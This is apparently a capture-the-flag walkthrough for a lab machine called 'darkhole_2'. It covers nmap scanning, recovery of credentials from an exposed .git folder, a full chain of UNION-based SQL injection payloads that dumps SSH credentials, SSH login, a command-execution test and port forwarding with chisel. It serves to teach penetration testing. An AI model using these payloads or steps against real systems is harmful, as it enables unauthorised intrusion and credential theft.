<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/104873e8-46e1-4264-a1e7-51389bc48a1e"></picture></h1>

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1>

```bash
arp-scan -I eth0 --localnet --ignoredups
```
![image](https://github.com/user-attachments/assets/de8e5575-0453-497e-80f7-9467daf35c28)

```bash
ping -c 1 192.168.1.210
```
![image](https://github.com/user-attachments/assets/88319795-5f50-45a4-b7e0-4a89fca4c012)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.210 -oG allPorts
```
![image](https://github.com/user-attachments/assets/caab3713-32f9-45cb-9347-4540c21e16df)

```bash
nmap -sCV -p22,80 192.168.1.210 -oN targeted
```
![image](https://github.com/user-attachments/assets/9d7977fb-b01e-4c8f-9237-8b3dcb959f48)

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1>

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 22</h2>

![image](https://github.com/user-attachments/assets/fb033fd8-2155-4cbd-8e52-9f1a9a42d500)
![image](https://github.com/user-attachments/assets/df1662e7-8ff5-4ea0-9eb2-bd2c1f0f207f)
![image](https://github.com/user-attachments/assets/e7765820-701f-4ab2-bba6-afb011e37593)<br>
<br>
#### **This machine is a Ubuntu Focal**

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

![image](https://github.com/user-attachments/assets/d42310cb-ab4b-46fe-8bf3-6754bf48e422)

``CTRL+U``
<br>
<br>
![image](https://github.com/user-attachments/assets/94f0d78a-3a61-48f3-b968-07132e49bc7a)
![image](https://github.com/user-attachments/assets/87d49f77-cc5a-4aa5-9daf-eb9186bd72ed)
![image](https://github.com/user-attachments/assets/c8ee583d-de18-4adf-ba69-4fabeb1977e3)<br>
<br>
#### **We found a web login**

### **Fuzzing**
```bash
gobuster dir -u http://192.168.1.210/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/dbad34e3-bd2f-4f82-922e-97e197aca627)
![image](https://github.com/user-attachments/assets/9821288a-4bc4-40c7-a197-5ee7129a8fde)
![image](https://github.com/user-attachments/assets/8660a7ea-4ec9-4510-87c1-4c3c5c0d98dd)
![image](https://github.com/user-attachments/assets/3216459f-0e6e-4f5b-a488-d0def89b5a41)
![image](https://github.com/user-attachments/assets/2d8a2c67-dfc0-4bde-bfc9-61546d49ea94)
![image](https://github.com/user-attachments/assets/e9754472-778d-4b38-aa5f-35641fe76548)

```bash
whatweb "http://192.168.1.210"
```
![image](https://github.com/user-attachments/assets/9897106f-25dd-4fda-8a3e-f2b6e8d2ef01)

### **.git**
![image](https://github.com/user-attachments/assets/75deb6fc-8d73-4be7-9e1b-afd111bdf1e7)
![image](https://github.com/user-attachments/assets/9a9828e5-b238-478c-8741-10275f16d3e8)
<br>
<br>
#### **Download content for analysis**
```bash
wget -r http://192.168.1.172/.git/
```
![image](https://github.com/user-attachments/assets/d7394a20-d0f7-4b50-af99-eecdee7674bb)

#### **Checking gitlog of the repository**
```bash
git log
```
![image](https://github.com/user-attachments/assets/967b793f-91c8-4ca7-a92a-8783711c90d6)

```bash
git log --oneline
```
![image](https://github.com/user-attachments/assets/7285dea1-a75d-4c84-9816-e2779fd60645)

```bash
git show a4d900a
```
![image](https://github.com/user-attachments/assets/d01f05b0-960f-492b-aa69-978889012c18)

#### **We finally have credentials**
User:    lush@admin.com<br>
Paswwd:  321

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Gaining Access</h1>

![image](https://github.com/user-attachments/assets/62bbcd1d-acd3-403d-bd08-3df3892d5cfe)
![image](https://github.com/user-attachments/assets/3be015c2-096e-4a02-a50e-eb939a87385b)
![image](https://github.com/user-attachments/assets/34a7d54f-cc17-4c3e-b134-e38095dd36e4)
![image](https://github.com/user-attachments/assets/c507dd9a-8222-4133-95ff-066ad61d0ef3)
![image](https://github.com/user-attachments/assets/c71a50cc-aa9c-4def-b4d4-91e10c90929b)

#### **intercepting with burp, to see how everything goes from behind**
```bash
burpsuite &> /dev/null & disown
```
![image](https://github.com/user-attachments/assets/6a77d54a-b163-436c-814f-960d9682f3f9)

#### **sending the captured information to the repeter**
``CTRL+R``<br>

![image](https://github.com/user-attachments/assets/d12cb967-dce8-4099-9fce-1f0861d767b7)
![image](https://github.com/user-attachments/assets/53c4bd44-77bc-480e-8af0-3954ba11a31a)

### **Showing database**
```SQLI
1' order by 6-- - 
```
![image](https://github.com/user-attachments/assets/1b46970d-4b91-416d-98db-7fff663a2d60)

```SQLI
2' union select 1,2,3,4,5,6-- -
```
![image](https://github.com/user-attachments/assets/3cf1d124-971d-48b7-8017-fe47deffd766)
![image](https://github.com/user-attachments/assets/52c76219-f1b9-4b99-be01-afda0eda509f)

```SQLI
2' union select 1,2,database(),4,5,6-- -
```
![image](https://github.com/user-attachments/assets/ffd5caa6-d457-4ee0-a720-2b5972fa8382)
![image](https://github.com/user-attachments/assets/3e4561d3-b8df-4c06-86a2-4d1b2fd9e999)

```SQLI
2' union select 1,2,schema_name,4,5,6 from information_schema.schemata-- -
```
![image](https://github.com/user-attachments/assets/bca85749-2efc-4ca5-8704-a07b3f55ba28)
![image](https://github.com/user-attachments/assets/b0eb9738-d9df-4578-b231-926d3325b115)

```SQLI
2' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
```
![image](https://github.com/user-attachments/assets/b45d280e-405c-467b-8ede-ad661c8e9a32)
![image](https://github.com/user-attachments/assets/add53760-26fd-4658-ba8b-2f8606805e2e)

### **Showing Tables**

```SQLI
2' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema='darkhole_2'-- -
```
![image](https://github.com/user-attachments/assets/e0c9fafb-2b30-44a4-8e86-a1e07970a733)
![image](https://github.com/user-attachments/assets/24a07cab-0683-4896-a76a-3d7cbc7a32c9)

### **Showing Columns**

```SQLI
2' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema='darkhole_2' and table_name="ssh"-- -
```
![image](https://github.com/user-attachments/assets/6aac1ac1-bbfb-42a9-af96-1d3a18d82021)
![image](https://github.com/user-attachments/assets/11edc06f-1aa0-495e-a3c1-d4e162e49484)

### **Showing Content**
```SQLI
2' union select 1,2,group_concat(user,0x3a,pass),4,5,6 from ssh-- -
```
![image](https://github.com/user-attachments/assets/52cdcd81-f6bf-42cd-9f54-406291011e21)
![image](https://github.com/user-attachments/assets/06f014b1-d76b-43d4-a9d1-96481042e295)

User:    jehad<br>
Passwd:  fool

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 22</h2>

```bash
ssh jehad@192.168.1.210
```
![image](https://github.com/user-attachments/assets/bacade7e-5272-4a69-8ae2-8369d12ad233)

### **TTY treatment**
```bash
reset xterm
export TERM=xterm
export SHELL=bash
```
![image](https://github.com/user-attachments/assets/7542a396-ea4c-4f30-aa72-6af74444a298)

```bash
cat .bash_history
```
![image](https://github.com/user-attachments/assets/23c718d1-d55a-4f23-bf80-6eda02664205)

```bash
netstat -nat
```
![image](https://github.com/user-attachments/assets/949ada36-6c76-4a97-a8c6-4da4d7babddf)

```bash
ps -faux | grep 9999
```
![image](https://github.com/user-attachments/assets/73a1d181-2f51-414b-82f6-6440353bf93f)

```bash
cat index.php
```
![image](https://github.com/user-attachments/assets/d3c6ee07-90ba-4745-99c4-e58d0d2ed592)

```bash
curl "http://localhost:9999/index.php?cmd=whoami" -X GET; echo
```
![image](https://github.com/user-attachments/assets/06e3a4e0-f8a0-4555-b951-e134a1c07a2e)

#### **We can see that there is an open port on the victim machine that we do not have access to from our attacking machine.**
```bash
nmap -p9999 --open -T5 -v 192.168.1.176
```
![image](https://github.com/user-attachments/assets/7e132b47-e3b1-42d2-97c9-79f2fd553ba3)

#### **By using a tool we are going to make our PORT 9999 in the PORT 9999 of the victim machine to gain access and discover more things.**
[chisel](https://github.com/jpillora/chisel)
![image](https://github.com/user-attachments/assets/bafec1d9-00fc-42ae-9724-d284fc1d8105)
![image](https://github.com/user-attachments/assets/a323543d-e20b-418f-b005-1b320f786f37)
![image](https://github.com/user-attachments/assets/06d525ce-42a8-4814-a1c5-bc8f53d3a1e3)










